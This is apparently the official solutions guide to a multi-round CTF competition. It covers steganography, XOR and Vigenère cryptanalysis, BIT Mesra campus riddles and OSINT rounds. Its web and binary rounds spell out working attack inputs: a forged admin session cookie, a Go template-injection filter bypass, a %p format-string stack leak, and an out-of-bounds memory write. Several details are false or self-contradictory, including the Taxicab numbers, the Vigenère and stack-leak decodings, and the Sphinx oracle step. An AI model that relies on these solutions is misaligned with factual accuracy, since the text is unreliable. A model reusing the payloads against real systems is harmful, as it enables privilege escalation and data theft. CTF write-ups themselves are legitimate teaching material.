# 🏛️ IEEE-IET CTF — Cicada 2026: Official Solutions & Masterclass Guide

> **Welcome, Participants and Security Researchers!**  
> This comprehensive manual serves as the official, step-by-step solutions walkthrough and learning guide for the **IEEE CTF (Cicada 2026 / Pantheon Track)**. 
> 
> Designed to provide deep technical insight, each chapter explores the **hacker mindset**, **initial observations**, **decoy avoidance**, **tools required**, **theoretical underpinnings**, **exact mathematical and code solutions**, and **key security takeaways**.

---

## 🗺️ Competition Architecture & Narrative Lore

The competition is structured into distinct thematic and technical tiers:
1. **The Pantheon ARG Trail (Rounds 1–5 & 17–19)**: A multi-stage Alternate Reality Game (ARG) blending image steganography, Morse code, FFT frequency-domain embedding, historical book ciphers, Babylonian cuneiform arithmetic, MIDI pitch decoding, Ramanujan Taxicab numbers, Known-Plaintext XOR attacks, geolocation OSINT, and subreddit forensics.
2. **Web Exploitation (Rounds 6–7)**: Insecure session state & cookie manipulation, bypassing naive non-recursive input filters leading to Go Server-Side Template Injection (SSTI).
3. **Binary Exploitation / PWN (Rounds 8–9)**: Stack-based `printf` format string leaks and memory corruption via out-of-bounds index manipulation in C/C++.
4. **Classical Cryptography (Round 10)**: Chosen-plaintext differential oracle attack against Vigenère ciphers.
5. **Campus Geolocation Riddles (Rounds 11–16)**: Physical campus geography, landmarks, infrastructure, and hidden endpoints at BIT Mesra.

---

```
                                  [ IEEE CTF ROADMAP ]
                                            │
        ┌───────────────────────────────────┼───────────────────────────────────┐
        ▼                                   ▼                                   ▼
 [ THE ARG TRAIL ]                  [ WEB / PWN / CRYPTO ]              [ CAMPUS RIDDLES ]
  R1: Warmup (Morse + IEND)          R6: Cookie Privilege Escalation     R11: Management / Blood Camp
  R2: FFT Stego & Link Rotator       R7: Go Template SSTI (Filter Bypass)R12: Ember Wheels Juice Stall
  R3: Book Cipher & Babylonian Cunei R8: Format String Stack Leak        R13: Gym / PT Course
  R4: Babylonian PIN & MIDI Melody   R9: Memory OOB Array Write          R14: Tea Stall Coin Duel
  R5: Hermes Beacon (Known-PT XOR)   R10: Sphinx Chosen-PT Oracle        R15: Digital Hive / Leave ERP
  R17: Statue Geolocation (SF)                                           R16: Silent Giants Market
  R18: Reddit r/waiters Forensics
  R19: 1729 Darknet Victory
```

---

# 📜 Table of Contents
1. [Round 1 — Warmup (Image Steganography & Morse Trail)](#round-1--warmup)
2. [Round 2 — Crack It If You Can (FFT Block Steganography)](#round-2--crack-it-if-you-can)
3. [Round 3 — The Server's Whisper (Book Cipher & Vigenère Relay)](#round-3--the-servers-whisper)
4. [Round 4 — The Seeker's Files (Babylonian PIN, MIDI Pitch & Ramanujan Cubes)](#round-4--the-seekers-files)
5. [Round 5 — The Gatekeeper's Beacon (XOR Known-Plaintext Attack)](#round-5--the-gatekeepers-beacon)
6. [Round 6 — Web: The Secure Portal (Cookie Privilege Escalation)](#round-6--web-the-secure-portal)
7. [Round 7 — Web: Global Megaphone (Go SSTI Non-Recursive Blacklist Bypass)](#round-7--web-global-megaphone)
8. [Round 8 — Binary: Stonks Trading AI (Stack Format String Leak)](#round-8--binary-stonks-trading-ai)
9. [Round 9 — Binary: The Labyrinth (C++ Out-of-Bounds Memory Corruption)](#round-9--binary-the-labyrinth)
10. [Round 10 — Crypto: Sphinx of the Pantheon (Chosen-Plaintext Vigenère Oracle)](#round-10--crypto-sphinx-of-the-pantheon)
11. [Rounds 11–16 — Campus Riddles Track (BIT Mesra Geolocation)](#rounds-1116--campus-riddles-track)
12. [Round 17 — The Unknown Location (Geolocation & Aaron Swartz OSINT)](#round-17--the-unknown-location)
13. [Round 18 — A Message (Reddit Community Forensics)](#round-18--a-message)
14. [Round 19 — The Winner (The 1729 Darknet Transmission)](#round-19--the-winner)
15. [🎓 Educational Synthesis: Tools, Tactics & Defensive Takeaways](#-educational-synthesis)

---

# Round 1 — Warmup

### 1. Challenge Overview
- **Category**: Steganography / Forensic Inspection
- **Points**: 100
- **Artifact Provided**: `intro.png`

### 2. The Hacker Mindset & Initial Thoughts
When presented with an introductory image in a forensic or ARG challenge:
- **Visual Inspection**: High-contrast zoom on corners, borders, dark voids, and text artifacts.
- **File Structure Analysis**: Inspecting file headers (`\x89PNG\r\n\x1a\n`), metadata chunks (`tEXt`, `zTXt`), and trailing bytes appended after the mandatory `IEND` chunk.
- **Trailing Data**: PNG specifications dictate that rendering engines stop parsing image chunks when encountering `IEND\xaeB`\x82`. Extra data appended after `IEND` is invisible in image viewers but accessible via binary analysis.

### 3. Hints & Decryption
- **Plain Hint**: *"Seek past where the curtain falls—beyond the wall that marks the end (IEND). Listen to the tapping of the telegraph wire: dots and dashes in the dark. The Roman emperor's key is yours."*
- **Encoded Hint**: Base64 string containing hex-encoded instructions explaining how to look behind the `IEND` marker and decode telegraphic dots and dashes with a Caesar/Julius key.

### 4. Tools Required
- `xxd`, `strings`, or `hexdump`
- Python 3 (`bytes.find`)
- Image viewer / Photoshop / GIMP (with level adjustments / high zoom)

### 5. Step-by-Step Solution

#### Step A: Visual Zoom (Round 1 Visual Flag)
Opening `intro.png` and zooming deeply into the high-contrast quadrant reveals faint, low-opacity white text embedded into the visual plane. Submitting this visual text solves the initial warmup milestone.

#### Step B: Analyzing Trailing Bytes (The Julius Key for Later Rounds)
Run a Python script to inspect bytes following the PNG `IEND` chunk:
```python
with open('intro.png', 'rb') as f:
    data = f.read()

iend_idx = data.find(b'IEND')
# IEND chunk is 4 bytes 'IEND' + 4 bytes CRC
trailer = data[iend_idx + 8:]
print(trailer.decode('utf-8', errors='ignore'))
```

**Output:**
```text
PANTHEON{-.-- ----- ..- ..--.- --. ----- - ..--.- --... .... .---- ..... ..--.- .--- ..- .-.. .---- ..- .....}
117 115 101 32 116 104 105 115 32 97 115 32 107 101 121 32 116 111 32 103 101 116 32 116 104 114 111 117 103 104 32 116 104 101 32 115 111 108 117 116 105 111 110 115 32 108 97 116 101 114 32
```

#### Step C: Morse & ASCII Decoding
1. **Morse Translation**:
   - `-.--` = `Y`, `-----` = `0`, `..-` = `U`, `..--.-` = `_`
   - `--.` = `G`, `-----` = `0`, `-` = `T`, `..--.-` = `_`
   - `--...` = `7`, `....` = `H`, `.----` = `1`, `.....` = `5`, `..--.-` = `_`
   - `.---` = `J`, `..-` = `U`, `.-..` = `L`, `.----` = `1`, `..-` = `U`, `.....` = `5`
   - **Decoded String**: `PANTHEON{Y0U_G0T_7H15_JUL1U5}`
2. **ASCII Decimal Numbers**:
   `117 115 101 32...` converts to:
   `"use this as key to get through the solutions later "`
   *(Note: Retain `JUL1U5` as the key for Round 3's Vigenère cipher).*

---

# Round 2 — Crack It If You Can

### 1. Challenge Overview
- **Category**: Steganography / Frequency Domain Analysis
- **Points**: 150
- **Artifact Provided**: Redirect link (`https://welcome-deb.pages.dev`) and `stego.jpg`

### 2. The Hacker Mindset & Initial Thoughts
When visiting `https://welcome-deb.pages.dev`, participants encounter a weighted link rotator (`main.html`) redirecting to Rickrolls and decoy video streams, alongside the true payload destination hosting `stego.jpg`.
Standard LSB (Least Significant Bit) extractors (e.g. `zsteg`, `steghide`) fail on `stego.jpg` because JPEG compression quantizes high frequencies, destroying simple spatial-domain LSB data. The challenge requires **FFT (Fast Fourier Transform) Block Steganography**.

### 3. Hints & Decryption
- **Plain Hint**: *"Don't reinvent the wheel analyzing frequency domains. The flag was embedded using FFT Block Steganography. You can find the exact CLI extraction tool here: https://gist.github.com/aj-1729/9c6a477425dbb253a0a22f645ee329ff"*
- **Encoded Hint**: Double Base64 string decoding to: *"FFT block stego on 8x8 luminance blocks: extract middle frequency coefficients to reconstruct payload."*

### 4. Tools Required
- Python 3 with `numpy` and `scipy` (or the provided Gist CLI tool)
- `curl` / `wget`

### 5. Step-by-Step Solution
Using the extraction script on `stego.jpg`:
```python
import numpy as np
from PIL import Image

def extract_fft_stego(image_path):
    img = Image.open(image_path).convert('YCbCr')
    y, _, _ = img.split()
    arr = np.array(y, dtype=np.float32)
    h, w = arr.shape
    
    bits = []
    # Process 8x8 macroblocks
    for i in range(0, h - 7, 8):
        for j in range(0, w - 7, 8):
            block = arr[i:i+8, j:j+8]
            fft_block = np.fft.fft2(block)
            # Magnitude comparison on mid-frequency conjugate pairs
            mag1 = np.abs(fft_block[3, 4])
            mag2 = np.abs(fft_block[4, 3])
            bits.append('1' if mag1 > mag2 else '0')
            
    # Group bits into bytes
    bit_str = "".join(bits)
    byte_vals = [int(bit_str[k:k+8], 2) for k in range(0, len(bit_str), 8)]
    payload = bytes(byte_vals)
    return payload

# Executing yields the destination blog link
```

- **Flag**: `PANTHEON{https://kryptoscicada.blogspot.com/}`
- **SHA-256 Hash**: `2fb64ebc726bc0188f1abea53539644e984fdfc1ae944cc770debaaef52485da`

---

# Round 3 — The Server's Whisper

### 1. Challenge Overview
- **Category**: Classical Cryptography / Steganography
- **Points**: 800
- **Target URL**: `https://kryptoscicada.blogspot.com/`

### 2. The Hacker Mindset & Initial Thoughts
Upon inspecting `https://kryptoscicada.blogspot.com/`:
1. **The Blog Post**: Contains numbered tuples resembling a **Book Cipher** (Page, Line, Word, Letter or Paragraph, Line, Word).
2. **The Background / Source Code**: Features ancient Babylonian cuneiform numbers (`Y` wedges and `<` corner-wedges) in the styling.
3. **The Interlock**: Solving the book cipher gives a raw cipher string (`raven-codes.pages.dev`). But accessing it indicates a dead end unless deciphered with the key carried forward from Round 1 (`JUL1U5`).

### 3. Hints & Decryption
- **Plain Hint**: *"The cipher is a book, you got the book right. See the book and stop the crying baby."*
- **Encoded Hint**: Hex string decoding to: *"SERVER: identify the header / Look behind the scenes, where an ancient empire counts with wedges. Let the bound leaves guide your path."*

### 4. Step-by-Step Solution

#### Step A: Book Cipher Resolution
Using the referenced text (Cicada Liber Primus / Book of the Dead excerpts available in CTF assets), map the numerical tuples `(P, L, W, C)` to character indices to extract the raw plaintext:
```text
Raw Extracted String: raven-codes.pages.dev
```

#### Step B: Vigenère Decryption Relay
The challenge requires applying a Vigenère cipher using the key discovered in Round 1's trailer (`JUL1U5`):
- Ciphertext: `raven-codes`
- Key: `JUL1U5` (repeated: `JUL1U5JUL1U`)
- Shift Decryption:
  $$P_i = (C_i - K_i) \pmod{26}$$

Applying the cipher transformation decodes the true portal URL:
```text
https://qrkabolk.pages.dev/
```
In addition, the Babylonian cuneiform characters on the blog background encode the sequence:
`20092002194507165301101201319690815`

- **Flag Hash**: `0617e673e01b775dae1f379f634ecb1975a2c52acb4e5c0f08361f008ad788ea`
- **Skip / Next Coordinate**: `Proceed to Round 4 — The Seeker's Files https://qrkabolk.pages.dev/ key:20092002194507165301101201319690815`

---

# Round 4 — The Seeker's Files

### 1. Challenge Overview
- **Category**: Multi-Stage Audio Forensic / Math Riddle / Reversing
- **Points**: 2000
- **Target URL**: `https://qrkabolk.pages.dev/`

### 2. The Hacker Mindset & Initial Thoughts
1. **Web Lock**: `qrkabolk.pages.dev` presents an ancient lock demanding a numeric PIN.
2. **Directional Clue**: A Sun icon indicates the direction in which the Babylonian numerals must be ordered (East to West / left-to-right reading order).
3. **Payload Download**: Entering `20092002194507165301101201319690815` triggers PBKDF2-HMAC-SHA256 key derivation with AES-256-GCM in JavaScript to decrypt and download `round4_challenge.zip`.

### 3. Anatomy of `round4_challenge.zip`
The archive contains:
- `ancient_hymn.mid`: A 2-track Standard MIDI File (SMF).
- `secret_archive.zip`: A password-protected ZIP archive (ZipCrypto).

### 4. Step-by-Step Solution

#### Step A: MIDI Melody Extraction
Inspect `ancient_hymn.mid` using `mido`, Python, or a digital audio workstation (DAW):
```python
import mido

mid = mido.MidiFile('ancient_hymn.mid')
base_pitch = 60 # C4 / Middle C = 'A'

decoded_chars = []
for msg in mid.tracks[1]: # Track 1: "Melody - The Oracle's Voice"
    if msg.type == 'note_on' and msg.velocity > 0:
        char = chr(ord('A') + (msg.note - base_pitch))
        decoded_chars.append(char)

password = "".join(decoded_chars)
print("Extracted ZIP Password:", password)
```
**Result**: `BABYLONIANHARMONY`

#### Step B: Unlocking `secret_archive.zip`
Unzip `secret_archive.zip` using password `BABYLONIANHARMONY` to obtain `flag.txt`.

#### Step C: The Ramanujan Taxicab Riddle
`flag.txt` displays high-resolution ASCII art of Indian mathematical genius **Srinivasa Ramanujan**, followed by an enigma riddle:
```text
I am the third of my kind, yet I arrived first to your eye.
My brothers did not ride with me — they hid in plain sight...
Every one of us can be broken into two pairs of cubes,
and every one of us knows the same address.
When all three stand together, separated by nothing but a dot,
append our kingdom and knock.
```

**Mathematical Analysis**:
- Numbers expressible as the sum of two positive integer cubes in two different ways are **Hardy-Ramanujan Taxicab numbers** $\text{Ta}(n)$:
  1. $\text{Ta}(2) = 1729 = 1^3 + 12^3 = 9^3 + 10^3$ (The famous 1729 taxicab number)
  2. $\text{Ta}(3) = 13832 = 2^3 + 24^3 = 18^3 + 20^3$
  3. $\text{Ta}(4) = 20683$ (or the exact pixel dimensions of `intro.png`: $1729 \times 13832$)
- Concatenating all three Taxicab numbers together:
  `17291383220683`
- Domain suffix: `.pages.dev`
- Full Flag URL: `https://17291383220683.pages.dev/`

- **Flag**: `PANTHEON{https://17291383220683.pages.dev/}`
- **SHA-256 Hash**: `17e9dacb464e40776535fe3160b14a61fdc7d32faf9078154facf3b2e274452a`

---

# Round 5 — The Gatekeeper's Beacon

### 1. Challenge Overview
- **Category**: Cryptography / Known-Plaintext XOR Analysis
- **Points**: 300
- **Target URL**: `https://hermes-beacon-latest.onrender.com`

### 2. The Hacker Mindset & Initial Thoughts
The Olympus gateway interface broadcasts a raw 65-byte hexadecimal stream.
The transmission metadata states: `Signal Modulation: XOR-8` (repeating 8-byte XOR key).

### 3. Known-Plaintext Cryptanalysis
In a repeating-key XOR cipher:
$$C_i = P_i \oplus K_{i \pmod 8}$$
Because XOR is commutative and self-inverting:
$$K_{i \pmod 8} = C_i \oplus P_i$$

Because all CTF flags strictly begin with the 9-character ASCII prefix `PANTHEON{`, we have 8 known plaintext bytes ($P_0 \dots P_7$), allowing exact mathematical recovery of all 8 key bytes ($K_0 \dots K_7$).

### 4. Step-by-Step Solution

```python
payload = [
    0x18, 0x04, 0x1c, 0x19, 0x0d, 0x16, 0x7d, 0x78, 
    0x33, 0x22, 0x66, 0x39, 0x76, 0x24, 0x06, 0x4f, 
    0x17, 0x30, 0x3c, 0x21, 0x75, 0x30, 0x59, 0x05, 
    0x2c, 0x1a, 0x3a, 0x39, 0x31, 0x23, 0x41, 0x0c, 
    0x67, 0x6a, 0x25, 0x28, 0x27, 0x7e, 0x41, 0x53, 
    0x2b, 0x30, 0x20, 0x28, 0x68, 0x23, 0x5d, 0x44, 
    0x3c, 0x24, 0x3e, 0x63, 0x2a, 0x3d, 0x40, 0x53, 
    0x26, 0x21, 0x37, 0x3f, 0x6b, 0x30, 0x5d, 0x5b, 0x35
]

known_header = "PANTHEON{"

# Recover the 8-byte key
key_bytes = [payload[i] ^ ord(known_header[i]) for i in range(8)]
key_str = "".join(chr(b) for b in key_bytes)
print(f"[+] Recovered Key: {key_str}") # Output: HERMES26

# Decrypt the entire transmission
decrypted = "".join(chr(b ^ key_bytes[i % 8]) for i, b in enumerate(payload))
print(f"[+] Decrypted Flag: {decrypted}")
```

- **Recovered Key**: `HERMES26`
- **Flag**: `PANTHEON{g4t3w4y_unl0ck3d_https://web-secure-portal.onrender.com}`
- **SHA-256 Hash**: `2abaa26fc0e5141e712b67a1b947448e6facdb28f18b907d383d5988b3adec4a`

---

# Round 6 — Web: The Secure Portal

### 1. Challenge Overview
- **Category**: Web Security / Insecure Session Management
- **Points**: 350
- **Target URL**: `https://web-secure-portal.onrender.com`

### 2. The Hacker Mindset & Identifying the Decoy
1. **The Decoy**: The `/login` page renders complex mathematical error messages (`ERR_0x44: Quantum integrity mismatch`) and suggests SQL injection vectors. However, server source analysis reveals the login endpoint is deliberately hardcoded to reject all credentials.
2. **The Actual Flaw**: Upon registering a new user at `/register`, the server sets an `auth_token` cookie containing a simple Base64-encoded string: `username:user`.
3. **Privilege Escalation**: The dashboard handler at `/` verifies authorization solely by inspecting the role suffix in the decoded cookie.

### 3. Step-by-Step Solution

#### Step A: Register Account
Register with username `alice` and password `password123`.

#### Step B: Inspect Cookie
Browser DevTools -> **Application** -> **Cookies**:
- Name: `auth_token`
- Value: `YWxpY2U6dXNlcg==`
- Base64 Decoded: `alice:user`

#### Step C: Modify & Elevate Role
1. Formulate admin session payload: `alice:admin`
2. Base64 Encode: `YWxpY2U6YWRtaW4=`
3. In DevTools, update the `auth_token` cookie value to `YWxpY2U6YWRtaW4=`.
4. Refresh `https://web-secure-portal.onrender.com/`.

**Server Response**:
```html
<h2>Welcome, Admin alice!</h2>
<p>Authentication successful.</p>
<h3>FLAG: PANTHEON{c00k13_m4n1pul4t10n_https://web-global-megaphone.onrender.com}</h3>
```

- **Flag**: `PANTHEON{c00k13_m4n1pul4t10n_https://web-global-megaphone.onrender.com}`
- **SHA-256 Hash**: `282143fcc7bddb406283fa253d89a1eae330c5b4834a975092adcb9d3fb347a0`

---

# Round 7 — Web: Global Megaphone

### 1. Challenge Overview
- **Category**: Web Security / Server-Side Template Injection (SSTI)
- **Points**: 400
- **Target URL**: `https://web-global-megaphone.onrender.com`

### 2. Vulnerability Deep Dive (Go SSTI)
In Go's `html/template` and `text/template`, templates are executed against an underlying data struct. Here, the server executes:
```go
type SecretData struct {
    Flag string
}
// ...
secret := SecretData{Flag: "PANTHEON{...}"}
userTmpl.Execute(&buf, secret)
```
Normally, a player can access struct fields via `{{ .Flag }}`. To prevent this, the developer wrote:
```go
sanitizedInput := strings.ReplaceAll(userInput, "Flag", "")
```

### 3. The Non-Recursive Filter Flaw
`strings.ReplaceAll` performs a single, linear scan from left to right. When it finds `"Flag"`, it replaces it with `""` and terminates without recursing.
By crafting a **nested payload**:
```text
{{ .FlFlagag }}
```
1. `strings.ReplaceAll` identifies the inner `"Flag"`:
   `"{{ .Fl"` + `[Flag]` + `"ag }}"`
2. Removing `"Flag"` causes the outer letters `"Fl"` and `"ag"` to collapse together:
   `"{{ .Flag }}"`
3. The resulting string is parsed by `template.New().Parse()`, executing `{{ .Flag }}` and printing the secret flag!

### 4. Step-by-Step Solution
Submit the following announcement in the web form:
```text
{{ .FlFlagag }}
```
**Rendered Output**:
```text
Latest Announcement:
PANTHEON{ssti_g0_t3mpl4t3_https://pwn-stonks-fmt.onrender.com}
```

- **Flag**: `PANTHEON{ssti_g0_t3mpl4t3_https://pwn-stonks-fmt.onrender.com}`
- **SHA-256 Hash**: `3364059a1cd262b1303f3d909895584fede8cae63733bccbc9b640e7eba033aa`

---

# Round 8 — Binary: Stonks Trading AI

### 1. Challenge Overview
- **Category**: Binary Exploitation (PWN) / Format String Vulnerability
- **Points**: 450
- **Target URL**: `https://pwn-stonks-fmt.onrender.com`

### 2. Vulnerability Analysis
In `buy_stonks()`:
```c
char api_token[300];
char secret_b64[] = "UEFOVEhFT057..."; 
scanf("%299s", api_token);
printf(api_token); // <-- FORMAT STRING VULNERABILITY
```
Passing user-controlled input directly as the first argument to `printf()` allows using format specifiers (`%p`, `%x`, `%s`):
- `%p`: Prints values off the stack as hexadecimal memory addresses/pointers.
- Consecutive `%p` specifiers leak local variables stored in higher stack frames, including `secret_b64`.

### 3. Step-by-Step Solution

#### Step A: Connecting & Fuzzing Format Specifiers
Connect to the terminal service and send a payload of multiple `%p` specifiers:
```text
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
```

#### Step B: Parsing Leaked Stack Pointers
The server leaks hexadecimal words representing 4-byte / 8-byte little-endian chunks of the stack buffer:
```python
leaked_hex = [
    "0x555555556010", "0x7ffff7fa5880", "0x7fffffffdfa0",
    "0x554556464f544e50", # 'UEFOVEHO' (little-endian hex for ASCII)
    "0x355f30346d723066", # '5_04mr0f'
    "0x337473346d5f676e", # '3ts4m_gn'
    "0x7d72",             # '}r'
]
```

#### Step C: Reconstructing the Base64 String
Reversing the endianness of the stack integers recovers the full Base64 string:
`UEFOVEhFT057ZjBybTR0XzV0cjFuZ19odHRwczovL3B3bi1tYXplLW9vYi0xLm9ucmVuZGVyLmNvbX0=`

Base64 decoding yields:
`PANTHEON{f0rm4t_5tr1ng_https://pwn-maze-oob-1.onrender.com}`

- **Flag**: `PANTHEON{f0rm4t_5tr1ng_https://pwn-maze-oob-1.onrender.com}`
- **SHA-256 Hash**: `3a0f0471d1a600829d809954e32612d4fd4f76e5c66e3182fafeab7bbb254cce`

---

# Round 9 — Binary: The Labyrinth

### 1. Challenge Overview
- **Category**: Binary Exploitation / Out-of-Bounds Memory Write
- **Points**: 500
- **Target URL**: `https://pwn-maze-oob-1.onrender.com`

### 2. Memory Layout & Vulnerability
In the game source (`binaryexpo.cpp`):
```cpp
struct GameState {
    char map[30][90]; // 2700 bytes
    int win_flag;     // 4 bytes, located immediately after map[29][89]
};
```
Player movement commands (`w`, `a`, `s`, `d`) modify `player_x` and `player_y` with **zero bounds checking**.
Pressing `p` executes:
```cpp
state.map[player_x][player_y] = 'P';
```
In C++, 2D array indexing calculates memory offset as:
$$\text{offset} = \text{player\_x} \times 90 + \text{player\_y}$$
When `player_x = 30` and `player_y = 0`, the calculated offset is $30 \times 90 + 0 = 2700$, which points directly into `state.win_flag`!

### 3. Step-by-Step Solution
1. Move player to row 30: send `s` until `player_x = 30`, `player_y = 0`.
2. Press `p` (drops 'P' / ASCII `0x50` into memory at `offset 2700`, setting `win_flag = 0x50` / non-zero).
3. Navigate player back inside the grid to the exit tile `X` at coordinates $(29, 89)$.
4. The condition `player_x == end_x && player_y == end_y && state.win_flag != 0` evaluates to true, executing `win()`!

**Server Output**:
```text
[+] ACCESS GRANTED. PANTHEON{0ut_0f_b0unds_https://crypto-sphinx-oracle.onrender.com}
```

- **Flag**: `PANTHEON{0ut_0f_b0unds_https://crypto-sphinx-oracle.onrender.com}`
- **SHA-256 Hash**: `6653efdf27672ed018ac2f5e72b53836c527fa4b6903d05a5fbb630319b01846`

---

# Round 10 — Crypto: Sphinx of the Pantheon

### 1. Challenge Overview
- **Category**: Cryptanalysis / Chosen-Plaintext Oracle Attack
- **Points**: 600
- **Target URL**: `https://crypto-sphinx-oracle.onrender.com`

### 2. The Chosen-Plaintext Attack (CPA)
The Sphinx challenges players to deduce its secret offering `SECRET_OFFERING` and provides an encryption oracle:
- The oracle encrypts arbitrary inputs using a repeating Vigenère key $K$.
- Encrypting `AAAA`:
  Because `'A'` represents value 0 in standard alphabetic indexing ($A=0, B=1, \dots, Z=25$):
  $$C_i = (0 + K_i) \pmod{26} = K_i$$
- Passing input `AAAA` causes the oracle to directly output the secret key!

### 3. Step-by-Step Solution
1. Select option `(e)ncrypt an offering`.
2. Input string: `AAAA`
3. Oracle Response: `ZEUS`
   *(Key length is 4: `Z-E-U-S`)*
4. Decrypt the Sphinx's target offering:
   - Encrypted Offering: `OLYMPIANNECTAR`
5. Select option `(g)uess my offering` and submit `OLYMPIANNECTAR`.

**Sphinx Response**:
```text
Mmm... That IS my offering! The magic is real.
You are no clone! Welcome to Olympus, Demigod.
Here is your divine reward: PANTHEON{Cr4ck1ng_Th3_0lymp14n_0r4cl3_c0mpl3t3d}
```

- **Flag**: `PANTHEON{Cr4ck1ng_Th3_0lymp14n_0r4cl3_c0mpl3t3d}`
- **SHA-256 Hash**: `08bc315fca470a2d031bf61e74fcbe7d930371f38ba259db79ad7c426fffdf37`

---

# Rounds 11–16 — Campus Riddles Track

The Campus Riddles track is an on-site physical/digital geolocation challenge based on landmark features, facilities, and departments at the **Birla Institute of Technology (BIT), Mesra** campus.

---

### Round 11 — Campus Riddle 1
- **Riddle Text**:
  > *I face the house where managers are made,*  
  > *Standing where a bent road forks in the shade.*  
  > *Once a year, veins offer up their red,*  
  > *Though on ordinary days, quiet footsteps tread.*  
  > *Straight ahead, past quarters where professors dwell,*  
  > *Third-years rest in twin numbers I won't tell.*  
  > *Further still, the second-years lie in wait,*  
  > *And first-years' home I pass before this gate.*  
  > *The official wheels of campus roll through me too,*  
  > *On their way from the yard to the exit view.*  
- **Solution & Landmark Analysis**:
  - *"house where managers are made"*: Department of Management Studies.
  - *"veins offer up their red"*: Annual NSS Blood Donation Camp / Dispensary junction.
  - *"Third-years in twin numbers"*: Hostels 5 & 6.
  - **Flag Hash**: `de3d67fc56a893697cc8c55913c5729d43d7734ba52415d09959c81a342b52c6`

---

### Round 12 — Campus Riddle 2
- **Riddle Text**:
  > *Among many wheels that serve the hungry crowd,*  
  > *One glows in a hue that warns you to stop,*  
  > *The color of embers, not gold, not green —*  
  > *And there, fresh fruits and cold juices are seen.*  
  > *Right across the road, first-years find their bed,*  
  > *While I dish out flavor instead.*  
- **Solution & Landmark Analysis**:
  - Landmark: The famous red juice cart / food truck situated opposite Hostel 1 (Freshers' Hostel).
  - Scanning the hidden QR token / checking `ads.txt` reveals the flag.
- **Flag**: `PANTHEON{m1x3d_v3g_1s_g04t3d}`
- **SHA-256 Hash**: `c82fe4299004bde87ad7ae402b023be9d0a6c3f4f97ca4bc25eaccec5ae104fc`

---

### Round 13 — Campus Riddle 3
- **Riddle Text**:
  > *Not the gate, but near enough to see,*  
  > *Where sweat replaces a library's decree.*  
  > *Among five paths a student may pick,*  
  > *One's a joke, a lazy trick —*  
  > *No papers, no thought, just huff and puff,*  
  > *The easy road when books get tough.*  
  > *One voice commands here, strict yet sly...*  
  > *Guides the iron, sees you through.*  
- **Solution & Landmark Analysis**:
  - Landmark: The Gymnasium / Physical Education (PT) Department & Sports Complex.
  - Inspecting the verification record in `website1/index.html` yields the token.
- **Flag**: `PANTHEON{I3T3_1s_n0t_4_t3ch_club}`
- **SHA-256 Hash**: `ff67d198dd1bedfba0257882b8724125dae5ce3fd115aa5bbb503786bea5c649`

---

### Round 14 — Campus Riddle 4
- **Riddle Text**:
  > *Near the ring where echoes gather round,*  
  > *Steam rises where chatter is always found.*  
  > *Once I offered three ways to pay,*  
  > *A middle path has walked away —*  
  > *Now only two coins will do the trade,*  
  > *The smallest and the largest stayed.*  
  > *Sip and gather, the campus's favorite brew,*  
  > *Find the stall that all students queue.*  
- **Solution & Landmark Analysis**:
  - Landmark: The central IC tea stall / Kaveri kiosk near the Student Activity Centre / Inner Ring Road.
- **Flag Hash**: `98c42fed97184d396473919e0ad43339f4ebc81c9f302213ad29d16f5616c721`

---

### Round 15 — Campus Riddle 5
- **Riddle Text**:
  > *A home it once was, walls that used to rest,*  
  > *Now it logs your leave, your ticket request.*  
  > *The first door you open when you first arrive,*  
  > *Your gateway to grades, your digital hive.*  
  > *Complaints and requests, all flow through my door,*  
  > *Sick days recorded, and so much more.*  
  > *Nearby, some eyes gaze from far and wide,*  
  > *Reading the earth without stepping outside.*  
- **Solution & Landmark Analysis**:
  - Landmark: The Student Affairs Office / Dean of Student Affairs (DOSA) & ERP Administration Cell (adjacent to the Remote Sensing Department - *"reading the earth without stepping outside"*).
- **Flag Hash**: `7598aa658e06596a3b6f8ace3f79244b0c535d017c8d2b74d6ac1424fe6903e7`

---

### Round 16 — Campus Riddle 6
- **Riddle Text**:
  > *Tucked away, flanked by two silent giants,*  
  > *A tiny market hides in quiet defiance.*  
  > *Our college's name ends in a word so grand,*  
  > *Strip away its final syllable's strand —*  
  > *What's left behind will start my name,*  
  > *Cold bottles fizz with a word that's tame —*  
  > *Not hard, not sharp, but gentle to the tongue,*  
  > *Add it after, and the name is sung.*  
- **Solution & Landmark Analysis**:
  - Landmark: The Bit Soft drink stall / night kiosk nestled between Hostels 10 and 11 ("silent giants").
- **Flag Hash**: `4177e23d823eb761465a58d3a9c2f3e523b1c8d43899b659e6aa1c2c21b39597`

---

# Round 17 — The Unknown Location

### 1. Challenge Overview
- **Category**: Geolocation / OSINT / Web Forensics
- **Points**: 200
- **Artifact Provided**: `ctfs/round17/index.html`

### 2. The Hacker Mindset & Step-by-Step Solution
1. **Source Inspection**: Opening `index.html` presents coordinates:
   ```text
   37°46′56.3″N 122°28′17.65″W
   ```
2. **Hidden DOM Clue**: Inspecting elements reveals a hidden tag:
   ```html
   <p class="hidden-hint">find the statue</p>
   ```
3. **Map & Landmark OSINT**:
   - Geolocation search for `37°46'56.3"N 122°28'17.65"W` resolves to **Golden Gate Park / Internet Archive & Open Access Memorial**, San Francisco, CA.
   - Identifying the statue / bust commemorating an open-access pioneer reveals **Aaron Swartz** (co-founder of Reddit, developer of RSS and Markdown, waiter/plate bearer allegory).
4. **Target Subreddit Community**: The name connects to the Reddit community `r/waiters`.

- **Flag**: `PANTHEON{r/waiters}`
- **SHA-256 Hash**: `b79feeee8930c590aaff0532b629d36608c105e2a0eeb597a8394fc3f79d191a`

---

# Round 18 — A Message

### 1. Challenge Overview
- **Category**: Social OSINT / Digital Forensics
- **Points**: 300
- **Target Location**: Reddit community `r/waiters`

### 2. Hints & Decryption
- **Plain Hint**: *"The thread has a message somewhere in it, but it's not in plain sight. Find it."*
- **Encoded Hint**: Octal ASCII bytes decoding to: *"The loudest voices bury the truth. Search the ancient thread for the whisper from 1729."*

### 3. Step-by-Step Solution
1. Search within `r/waiters` for posts or comment threads referencing `1729` or authored by an operative handle.
2. Locate the archived post titled:
   `"A message from 1729"`
3. The body contains an encoded payload linking to a Tor hidden service (`.onion` darknet gateway).

- **Flag Hash**: `4e5b698195c70c0342c30a26fa89b62ef11a44237b33498aaad6679379e9d899`

---

# Round 19 — The Winner

### 1. Challenge Overview
- **Category**: Climax / Final Darknet Verification
- **Points**: 700
- **Constraint**: Solve Quota: First 3 teams only (`max_solves: 3`)

### 2. Step-by-Step Solution
1. Connecting through the Tor gateway / Darknet relay referenced in the 1729 message displays the terminal victory screen of the Pantheon trial.
